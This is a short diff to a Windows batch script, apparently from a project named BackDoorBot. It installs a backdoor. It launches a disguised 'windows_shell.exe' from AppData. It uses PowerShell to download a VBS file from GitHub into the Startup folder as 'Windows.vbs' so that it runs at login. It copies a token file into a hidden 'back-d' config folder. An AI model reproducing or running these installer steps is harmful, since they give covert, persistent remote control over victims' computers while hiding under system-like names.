@@ -13,6 +13,6 @@ start %appdata%\Microsoft\Windows\windows_shell.exe
 
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/bot/invis.vbs -OutFile '%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows.vbs'"
 
-copy ".\token\%Token_Num%.txt" "%appdata%\Microsoft\Windows\back-d\config.json"
+copy ".\token\%Token_Num%" "%appdata%\Microsoft\Windows\back-d\config"
 
 pause > nul
